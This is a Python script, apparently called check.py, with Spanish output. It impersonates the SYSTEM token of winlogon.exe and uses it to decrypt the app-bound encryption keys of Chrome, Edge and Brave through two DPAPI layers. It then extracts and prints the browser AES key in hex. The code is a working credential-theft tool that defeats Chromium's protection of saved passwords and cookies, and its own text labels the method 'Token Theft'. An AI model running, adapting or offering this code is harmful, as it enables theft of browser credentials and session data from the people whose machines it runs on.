import os
import sys
import json
import base64
import win32crypt
import ctypes
import struct

def get_winlogon_pid():
    TH32CS_SNAPPROCESS = 2
    class PROCESSENTRY32(ctypes.Structure):
        _fields_ = [
            ("dwSize", ctypes.wintypes.DWORD),
            ("cntUsage", ctypes.wintypes.DWORD),
            ("th32ProcessID", ctypes.wintypes.DWORD),
            ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),
            ("th32ModuleID", ctypes.wintypes.DWORD),
            ("cntThreads", ctypes.wintypes.DWORD),
            ("th32ParentProcessID", ctypes.wintypes.DWORD),
            ("pcPriClassBase", ctypes.wintypes.LONG),
            ("dwFlags", ctypes.wintypes.DWORD),
            ("szExeFile", ctypes.c_char * 260)
        ]
    kernel32 = ctypes.windll.kernel32
    hProcessSnap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if not hProcessSnap or hProcessSnap == -1:
        return 0
    pe32 = PROCESSENTRY32()
    pe32.dwSize = ctypes.sizeof(PROCESSENTRY32)
    if not kernel32.Process32First(hProcessSnap, ctypes.byref(pe32)):
        kernel32.CloseHandle(hProcessSnap)
        return 0
    while True:
        exe_name = pe32.szExeFile.decode('utf-8', 'ignore').lower()
        if exe_name == "winlogon.exe":
            kernel32.CloseHandle(hProcessSnap)
            return pe32.th32ProcessID
        if not kernel32.Process32Next(hProcessSnap, ctypes.byref(pe32)):
            break
    kernel32.CloseHandle(hProcessSnap)
    return 0

class TokenManager:
    def __init__(self):
        self.impersonated = False

    def __enter__(self):
        kernel32 = ctypes.windll.kernel32
        advapi32 = ctypes.windll.advapi32
        
        pid = get_winlogon_pid()
        if not pid:
            raise Exception("winlogon.exe no encontrado")
            
        hProcess = kernel32.OpenProcess(0x0400 | 0x0040, False, pid)
        if not hProcess:
            raise Exception(f"OpenProcess falló: {ctypes.GetLastError()}")
            
        hToken = ctypes.c_void_p()
        if not advapi32.OpenProcessToken(hProcess, 0x0002 | 0x0008, ctypes.byref(hToken)):
            kernel32.CloseHandle(hProcess)
            raise Exception("OpenProcessToken falló")
            
        hDupToken = ctypes.c_void_p()
        if not advapi32.DuplicateTokenEx(hToken, 0x0002 | 0x0008 | 0x0004 | 0x0010, None, 2, 1, ctypes.byref(hDupToken)):
            kernel32.CloseHandle(hProcess)
            raise Exception("DuplicateTokenEx falló")
            
        if not advapi32.ImpersonateLoggedOnUser(hDupToken):
            kernel32.CloseHandle(hProcess)
            raise Exception("ImpersonateLoggedOnUser falló")
            
        self.impersonated = True
        kernel32.CloseHandle(hProcess)
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        if self.impersonated:
            ctypes.windll.advapi32.RevertToSelf()

def check_browser(name, local_state_path):
    print(f"\n{'='*50}\n🔍 ANALIZANDO: {name}\n{'='*50}")
    if not os.path.exists(local_state_path):
        print(f"[!] No existe Local State en: {local_state_path}")
        return
        
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            config = json.load(f)
    except Exception as e:
        print(f"[X] Error leyendo JSON: {e}")
        return
        
    app_bound_b64 = config.get("os_crypt", {}).get("app_bound_encrypted_key")
    if not app_bound_b64:
        print(f"[-] No hay app_bound_encrypted_key en Local State.")
        return
        
    print(f"[+] app_bound_encrypted_key encontrado (Longitud Base64: {len(app_bound_b64)})")
    
    raw = base64.b64decode(app_bound_b64)
    print(f"[+] Decodificado Base64. Longitud cruda: {len(raw)} bytes")
    
    if not raw.startswith(b"APPB"):
        print(f"[X] El blob no empieza con APPB. Primeros bytes: {raw[:4].hex()}")
        return
        
    print("[+] El blob tiene prefijo APPB válido.")
    key_blob_encrypted = raw[4:]
    print(f"    -> Longitud de blob DPAPI encriptado: {len(key_blob_encrypted)} bytes")
    
    print("\n[+] Intentando descifrado SYSTEM DPAPI (Paso 1/2)...")
    try:
        with TokenManager():
            system_decrypted = win32crypt.CryptUnprotectData(key_blob_encrypted, None, None, None, 0)[1]
        print(f"    -> ÉXITO. Longitud resultante: {len(system_decrypted)} bytes")
    except Exception as e:
        print(f"[X] FALLÓ descifrado SYSTEM DPAPI: {e}")
        return
        
    print("\n[+] Intentando descifrado USER DPAPI (Paso 2/2)...")
    try:
        user_decrypted = win32crypt.CryptUnprotectData(system_decrypted, None, None, None, 0)[1]
        print(f"    -> ÉXITO. Longitud resultante final: {len(user_decrypted)} bytes")
    except Exception as e:
        print(f"[X] FALLÓ descifrado USER DPAPI: {e}")
        print("    Posiblemente Edge/Brave solo usen una capa de DPAPI.")
        print("    Vamos a inspeccionar el volcado del Paso 1 (SYSTEM) de todas formas:")
        user_decrypted = system_decrypted
        
    print("\n[+] Inspección Forense del Payload Final:")
    print(f"    -> HEX Dump (primeros 64 bytes):\n       {user_decrypted[:64].hex()}")
    
    # Intento de parseo estándar de Chromium
    if len(user_decrypted) >= 9:
        try:
            import io
            buffer = io.BytesIO(user_decrypted)
            header_len = struct.unpack('<I', buffer.read(4))[0]
            print(f"    -> Extraido Header Len: {header_len}")
            header = buffer.read(header_len)
            content_len = struct.unpack('<I', buffer.read(4))[0]
            print(f"    -> Extraido Content Len: {content_len}")
            flag = buffer.read(1)[0]
            print(f"    -> Extraido Flag: {flag} (0x{flag:02X})")
            
            if flag == 3:
                aes_key = buffer.read(32)
                iv = buffer.read(12)
                print(f"    -> Estructura Flag 3 Detectada. AES Key encriptada: {aes_key.hex()}")
        except Exception as e:
            print(f"[!] Error intentando parsear como struct estándar de Chrome: {e}")
            
    print("\n--------------------------------------------------")

if __name__ == "__main__":
    if ctypes.windll.shell32.IsUserAnAdmin() == 0:
        print("ERROR: Debes ejecutar check.py como Administrador para probar Token Theft.")
        sys.exit(1)
        
    local_appdata = os.environ.get("LOCALAPPDATA")
    
    targets = {
        "Google Chrome": os.path.join(local_appdata, "Google", "Chrome", "User Data", "Local State"),
        "Microsoft Edge": os.path.join(local_appdata, "Microsoft", "Edge", "User Data", "Local State"),
        "Brave": os.path.join(local_appdata, "BraveSoftware", "Brave-Browser", "User Data", "Local State"),
    }
    
    for name, path in targets.items():
        check_browser(name, path)
        
    print("\nVerificación completada. Por favor, copia el output y pasámelo.")
